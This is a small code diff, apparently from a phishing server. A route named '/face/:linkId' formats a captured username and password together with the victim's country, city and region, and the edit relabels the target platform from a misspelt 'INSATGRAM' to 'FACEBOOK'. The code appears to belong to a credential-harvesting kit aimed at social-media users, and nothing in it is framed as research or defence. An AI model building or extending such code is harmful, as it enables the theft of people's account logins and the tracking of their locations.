@@ -172,7 +172,7 @@ router.post("/face/:linkId", async (req, res) => {
 USERNAME: ${username}
 PASSWORD: ${password}
 
-PLATFORM: INSATGRAM
+PLATFORM: FACEBOOK
 COUNTRY: ${country}
 CITY: ${city}
 REGION: ${region}
